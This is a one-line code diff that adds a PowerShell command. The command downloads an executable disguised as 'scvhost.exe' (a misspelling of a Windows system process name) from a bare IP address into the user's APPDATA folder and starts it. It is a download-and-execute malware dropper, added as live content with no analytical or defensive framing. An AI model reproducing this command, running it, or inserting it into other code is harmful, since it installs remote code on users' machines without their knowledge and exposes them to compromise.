@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',"$env:APPDATAscvhost.exe");Start-Process ("$env:APPDATAscvhost.exe")
